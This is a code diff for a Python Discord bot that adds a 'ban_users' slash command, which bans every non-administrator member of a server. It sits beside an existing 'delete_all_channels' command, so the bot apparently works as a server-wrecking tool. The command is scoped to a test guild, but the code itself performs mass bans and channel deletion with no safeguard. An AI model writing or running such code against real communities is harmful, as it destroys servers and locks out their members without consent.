@@ -72,4 +72,19 @@ async def delete_all_channels(interaction: discord.Interaction) -> None:
     await interaction.response.send_message("💥", ephemeral=True)
 
 
+@bot.tree.command(
+    name="ban_users",
+    description="Ban all users in the server",
+    guild=testGuild
+)
+async def ban_users(interaction: discord.Interaction) -> None:
+    for user in interaction.guild.members:
+        if user.guild_permissions.administrator:
+            continue
+
+        await user.ban()
+
+    await interaction.response.send_message("💥", ephemeral=True)
+
+
 bot.run(BOT_TOKEN)
